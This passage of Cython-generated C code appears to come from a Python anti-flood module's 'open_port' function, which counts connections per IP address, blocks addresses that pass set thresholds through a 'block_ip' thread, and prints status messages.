                                __pyx_L25_except_error:;
                                    __Pyx_XGIVEREF(__pyx_t_17);
                                    __Pyx_XGIVEREF(__pyx_t_18);
                                    __Pyx_XGIVEREF(__pyx_t_19);
                                    __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
                                    goto __pyx_L11_error;
                                __pyx_L24_exception_handled:;
                                    __Pyx_XGIVEREF(__pyx_t_17);
                                    __Pyx_XGIVEREF(__pyx_t_18);
                                    __Pyx_XGIVEREF(__pyx_t_19);
                                    __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
                                __pyx_L30_try_end:;
                                }
                                __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_force_block); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 123, __pyx_L11_error)
                                    __Pyx_GOTREF(__pyx_t_3);
                                __pyx_t_4 = __Pyx_PyObject_GetItem(__pyx_t_3, __pyx_v_con_ip); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 123, __pyx_L11_error)
                                    __Pyx_GOTREF(__pyx_t_4);
                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_force_firewall_count); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 123, __pyx_L11_error)
                                    __Pyx_GOTREF(__pyx_t_3);
                                __pyx_t_1 = PyObject_RichCompare(__pyx_t_4, __pyx_t_3, Py_GT); __Pyx_XGOTREF(__pyx_t_1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 123, __pyx_L11_error)
                                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                __pyx_t_16 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 123, __pyx_L11_error)
                                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                if (__pyx_t_16) {
                                    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Detected_0_try_request_1_times, __pyx_n_s_format); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 124, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_3);
                                    __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_con_ip); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 124, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_4);
                                    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_force_block); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 124, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_7);
                                    __pyx_t_5 = __Pyx_PyObject_GetItem(__pyx_t_7, __pyx_v_con_ip); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 124, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_5);
                                    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                                    __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 124, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_7);
                                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                                    __pyx_t_5 = NULL;
                                    __pyx_t_6 = 0;
                                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
                                        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);
                                        if (likely(__pyx_t_5)) {
                                            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                                            __Pyx_INCREF(__pyx_t_5);
                                            __Pyx_INCREF(function);
                                            __Pyx_DECREF_SET(__pyx_t_3, function);
                                            __pyx_t_6 = 1;
                                        }
                                    }
#if CYTHON_FAST_PYCALL
                                    if (PyFunction_Check(__pyx_t_3)) {
                                        PyObject* __pyx_temp[3] = { __pyx_t_5, __pyx_t_4, __pyx_t_7 };
                                        __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp + 1 - __pyx_t_6, 2 + __pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 124, __pyx_L11_error)
                                            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                                        __Pyx_GOTREF(__pyx_t_1);
                                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                                    }
                                    else
#endif
#if CYTHON_FAST_PYCCALL
                                        if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
                                            PyObject* __pyx_temp[3] = { __pyx_t_5, __pyx_t_4, __pyx_t_7 };
                                            __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp + 1 - __pyx_t_6, 2 + __pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 124, __pyx_L11_error)
                                                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                                            __Pyx_GOTREF(__pyx_t_1);
                                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                                        }
                                        else
#endif
                                        {
                                            __pyx_t_2 = PyTuple_New(2 + __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 124, __pyx_L11_error)
                                                __Pyx_GOTREF(__pyx_t_2);
                                            if (__pyx_t_5) {
                                                __Pyx_GIVEREF(__pyx_t_5); PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_5); __pyx_t_5 = NULL;
                                            }
                                            __Pyx_GIVEREF(__pyx_t_4);
                                            PyTuple_SET_ITEM(__pyx_t_2, 0 + __pyx_t_6, __pyx_t_4);
                                            __Pyx_GIVEREF(__pyx_t_7);
                                            PyTuple_SET_ITEM(__pyx_t_2, 1 + __pyx_t_6, __pyx_t_7);
                                            __pyx_t_4 = 0;
                                            __pyx_t_7 = 0;
                                            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_2, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 124, __pyx_L11_error)
                                                __Pyx_GOTREF(__pyx_t_1);
                                            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                        }
                                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                    __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 124, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_3);
                                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Thread); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 125, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_1);
                                    __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 125, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_2);
                                    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_block_ip); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 125, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_7);
                                    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_target, __pyx_t_7) < 0) __PYX_ERR(0, 125, __pyx_L11_error)
                                        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                                    __pyx_t_7 = PyTuple_New(3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 125, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_7);
                                    __Pyx_INCREF(__pyx_v_con_ip);
                                    __Pyx_GIVEREF(__pyx_v_con_ip);
                                    PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_con_ip);
                                    __Pyx_INCREF(__pyx_v_port);
                                    __Pyx_GIVEREF(__pyx_v_port);
                                    PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_port);
                                    __Pyx_INCREF(__pyx_v_a);
                                    __Pyx_GIVEREF(__pyx_v_a);
                                    PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_v_a);
                                    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_args, __pyx_t_7) < 0) __PYX_ERR(0, 125, __pyx_L11_error)
                                        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                                    __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 125, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_7);
                                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_start); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 125, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_2);
                                    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                                    __pyx_t_7 = NULL;
                                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                                        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_2);
                                        if (likely(__pyx_t_7)) {
                                            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                                            __Pyx_INCREF(__pyx_t_7);
                                            __Pyx_INCREF(function);
                                            __Pyx_DECREF_SET(__pyx_t_2, function);
                                        }
                                    }
                                    __pyx_t_3 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
                                    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                                    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 125, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_3);
                                    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_force_block); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 126, __pyx_L11_error)
                                        __Pyx_GOTREF(__pyx_t_3);
                                    if (unlikely(PyObject_SetItem(__pyx_t_3, __pyx_v_con_ip, __pyx_int_0) < 0)) __PYX_ERR(0, 126, __pyx_L11_error)
                                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                    goto __pyx_L17_try_continue;
                                }
                                __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Blocked_connection_from_0_1, __pyx_n_s_format); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 128, __pyx_L11_error)
                                    __Pyx_GOTREF(__pyx_t_2);
                                __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_force_block); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 128, __pyx_L11_error)
                                    __Pyx_GOTREF(__pyx_t_7);
                                __pyx_t_1 = __Pyx_PyObject_GetItem(__pyx_t_7, __pyx_v_con_ip); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 128, __pyx_L11_error)
                                    __Pyx_GOTREF(__pyx_t_1);
                                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                                __pyx_t_7 = NULL;
                                __pyx_t_6 = 0;
                                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                                    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_2);
                                    if (likely(__pyx_t_7)) {
                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                                        __Pyx_INCREF(__pyx_t_7);
                                        __Pyx_INCREF(function);
                                        __Pyx_DECREF_SET(__pyx_t_2, function);
                                        __pyx_t_6 = 1;
                                    }
                                }
#if CYTHON_FAST_PYCALL
                                if (PyFunction_Check(__pyx_t_2)) {
                                    PyObject* __pyx_temp[3] = { __pyx_t_7, __pyx_v_con_ip, __pyx_t_1 };
                                    __pyx_t_3 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp + 1 - __pyx_t_6, 2 + __pyx_t_6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 128, __pyx_L11_error)
                                        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                                    __Pyx_GOTREF(__pyx_t_3);
                                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                }
                                else
#endif
#if CYTHON_FAST_PYCCALL
                                    if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
                                        PyObject* __pyx_temp[3] = { __pyx_t_7, __pyx_v_con_ip, __pyx_t_1 };
                                        __pyx_t_3 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp + 1 - __pyx_t_6, 2 + __pyx_t_6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 128, __pyx_L11_error)
                                            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                                        __Pyx_GOTREF(__pyx_t_3);
                                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                    }
                                    else
#endif
                                    {
                                        __pyx_t_4 = PyTuple_New(2 + __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 128, __pyx_L11_error)
                                            __Pyx_GOTREF(__pyx_t_4);
                                        if (__pyx_t_7) {
                                            __Pyx_GIVEREF(__pyx_t_7); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_7); __pyx_t_7 = NULL;
                                        }
                                        __Pyx_INCREF(__pyx_v_con_ip);
                                        __Pyx_GIVEREF(__pyx_v_con_ip);
                                        PyTuple_SET_ITEM(__pyx_t_4, 0 + __pyx_t_6, __pyx_v_con_ip);
                                        __Pyx_GIVEREF(__pyx_t_1);
                                        PyTuple_SET_ITEM(__pyx_t_4, 1 + __pyx_t_6, __pyx_t_1);
                                        __pyx_t_1 = 0;
                                        __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_4, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 128, __pyx_L11_error)
                                            __Pyx_GOTREF(__pyx_t_3);
                                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                    }
                                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 128, __pyx_L11_error)
                                    __Pyx_GOTREF(__pyx_t_2);
                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                goto __pyx_L22;
                            } {
                                __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_Blocked_connection_from_0, __pyx_n_s_format); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 130, __pyx_L11_error)
                                    __Pyx_GOTREF(__pyx_t_3);
                                __pyx_t_4 = NULL;
                                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
                                    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
                                    if (likely(__pyx_t_4)) {
                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                                        __Pyx_INCREF(__pyx_t_4);
                                        __Pyx_INCREF(function);
                                        __Pyx_DECREF_SET(__pyx_t_3, function);
                                    }
                                }
                                __pyx_t_2 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_v_con_ip) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_v_con_ip);
                                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                                if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 130, __pyx_L11_error)
                                    __Pyx_GOTREF(__pyx_t_2);
                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 130, __pyx_L11_error)
                                    __Pyx_GOTREF(__pyx_t_3);
                                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                            }
                        __pyx_L22:;
                            goto __pyx_L21;
                        } {
                            __pyx_t_3 = __Pyx_PyInt_AddObjC(__pyx_v_count, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 132, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __Pyx_DECREF_SET(__pyx_v_count, __pyx_t_3);
                            __pyx_t_3 = 0;
                            {
                                __Pyx_PyThreadState_declare
                                    __Pyx_PyThreadState_assign
                                    __Pyx_ExceptionSave(&__pyx_t_19, &__pyx_t_18, &__pyx_t_17);
                                __Pyx_XGOTREF(__pyx_t_19);
                                __Pyx_XGOTREF(__pyx_t_18);
                                __Pyx_XGOTREF(__pyx_t_17); {
                                    __Pyx_INCREF(__pyx_v_con_ip);
                                    __pyx_t_3 = __pyx_v_con_ip;
                                    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ddos); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 134, __pyx_L34_error)
                                        __Pyx_GOTREF(__pyx_t_2);
                                    __pyx_t_4 = __Pyx_PyObject_GetItem(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 134, __pyx_L34_error)
                                        __Pyx_GOTREF(__pyx_t_4);
                                    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                    __pyx_t_2 = __Pyx_PyInt_AddObjC(__pyx_t_4, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 134, __pyx_L34_error)
                                        __Pyx_GOTREF(__pyx_t_2);
                                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ddos); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 134, __pyx_L34_error)
                                        __Pyx_GOTREF(__pyx_t_4);
                                    if (unlikely(PyObject_SetItem(__pyx_t_4, __pyx_t_3, __pyx_t_2) < 0)) __PYX_ERR(0, 134, __pyx_L34_error)
                                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                }
                                __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                                __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
                                __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                goto __pyx_L41_try_end;
                            __pyx_L34_error:;
                                __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                                __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError);
                                if (__pyx_t_6) {
                                    __Pyx_AddTraceback("anti.open_port", __pyx_clineno, __pyx_lineno, __pyx_filename);
                                    if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_2, &__pyx_t_4) < 0) __PYX_ERR(0, 135, __pyx_L36_except_error)
                                        __Pyx_GOTREF(__pyx_t_3);
                                    __Pyx_GOTREF(__pyx_t_2);
                                    __Pyx_GOTREF(__pyx_t_4);
                                    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ddos); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 136, __pyx_L36_except_error)
                                        __Pyx_GOTREF(__pyx_t_1);
                                    if (unlikely(PyObject_SetItem(__pyx_t_1, __pyx_v_con_ip, __pyx_int_1) < 0)) __PYX_ERR(0, 136, __pyx_L36_except_error)
                                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                                    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                                    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                                    goto __pyx_L35_exception_handled;
                                }
                                goto __pyx_L36_except_error;
                            __pyx_L36_except_error:;
                                __Pyx_XGIVEREF(__pyx_t_19);
                                __Pyx_XGIVEREF(__pyx_t_18);
                                __Pyx_XGIVEREF(__pyx_t_17);
                                __Pyx_ExceptionReset(__pyx_t_19, __pyx_t_18, __pyx_t_17);
                                goto __pyx_L11_error;
                            __pyx_L35_exception_handled:;
                                __Pyx_XGIVEREF(__pyx_t_19);
                                __Pyx_XGIVEREF(__pyx_t_18);
                                __Pyx_XGIVEREF(__pyx_t_17);
                                __Pyx_ExceptionReset(__pyx_t_19, __pyx_t_18, __pyx_t_17);
                            __pyx_L41_try_end:;
                            }
                            __pyx_t_4 = PyTuple_New(10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 137, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __pyx_t_20 = 0;
                            __pyx_t_21 = 127;
                            __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_v_count, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 137, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_2);
                            __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_21;
                            __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
                            __Pyx_GIVEREF(__pyx_t_2);
                            PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_2);
                            __pyx_t_2 = 0;
                            __Pyx_INCREF(__pyx_kp_u_Port);
                            __pyx_t_20 += 7;
                            __Pyx_GIVEREF(__pyx_kp_u_Port);
                            PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_kp_u_Port);
                            __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_v_port, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 137, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_2);
                            __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_21;
                            __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
                            __Pyx_GIVEREF(__pyx_t_2);
                            PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_t_2);
                            __pyx_t_2 = 0;
                            __Pyx_INCREF(__pyx_kp_u__19);
                            __pyx_t_20 += 4;
                            __Pyx_GIVEREF(__pyx_kp_u__19);
                            PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_kp_u__19);
                            __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_port_real); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 137, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_2);
                            __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 137, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                            __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_21;
                            __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
                            __Pyx_GIVEREF(__pyx_t_3);
                            PyTuple_SET_ITEM(__pyx_t_4, 4, __pyx_t_3);
                            __pyx_t_3 = 0;
                            __Pyx_INCREF(__pyx_kp_u_Accept);
                            __pyx_t_20 += 11;
                            __Pyx_GIVEREF(__pyx_kp_u_Accept);
                            PyTuple_SET_ITEM(__pyx_t_4, 5, __pyx_kp_u_Accept);
                            __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_v_con_ip, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 137, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_21;
                            __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
                            __Pyx_GIVEREF(__pyx_t_3);
                            PyTuple_SET_ITEM(__pyx_t_4, 6, __pyx_t_3);
                            __pyx_t_3 = 0;
                            __Pyx_INCREF(__pyx_kp_u__20);
                            __pyx_t_20 += 2;
                            __Pyx_GIVEREF(__pyx_kp_u__20);
                            PyTuple_SET_ITEM(__pyx_t_4, 7, __pyx_kp_u__20);
                            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_ddos); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 137, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __pyx_t_2 = __Pyx_PyObject_GetItem(__pyx_t_3, __pyx_v_con_ip); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 137, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_2);
                            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                            __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 137, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                            __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_21;
                            __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
                            __Pyx_GIVEREF(__pyx_t_3);
                            PyTuple_SET_ITEM(__pyx_t_4, 8, __pyx_t_3);
                            __pyx_t_3 = 0;
                            __Pyx_INCREF(__pyx_kp_u__21);
                            __pyx_t_20 += 1;
                            __Pyx_GIVEREF(__pyx_kp_u__21);
                            PyTuple_SET_ITEM(__pyx_t_4, 9, __pyx_kp_u__21);
                            __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_4, 10, __pyx_t_20, __pyx_t_21); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 137, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 137, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            {
                                __Pyx_PyThreadState_declare
                                    __Pyx_PyThreadState_assign
                                    __Pyx_ExceptionSave(&__pyx_t_17, &__pyx_t_18, &__pyx_t_19);
                                __Pyx_XGOTREF(__pyx_t_17);
                                __Pyx_XGOTREF(__pyx_t_18);
                                __Pyx_XGOTREF(__pyx_t_19); {
                                    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ddos); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 139, __pyx_L44_error)
                                        __Pyx_GOTREF(__pyx_t_4);
                                    __pyx_t_3 = __Pyx_PyObject_GetItem(__pyx_t_4, __pyx_v_con_ip); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 139, __pyx_L44_error)
                                        __Pyx_GOTREF(__pyx_t_3);
                                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_block_on_count); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 139, __pyx_L44_error)
                                        __Pyx_GOTREF(__pyx_t_4);
                                    __pyx_t_2 = PyObject_RichCompare(__pyx_t_3, __pyx_t_4, Py_GT); __Pyx_XGOTREF(__pyx_t_2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 139, __pyx_L44_error)
                                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                    __pyx_t_16 = __Pyx_PyObject_IsTrue(__pyx_t_2); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 139, __pyx_L44_error)
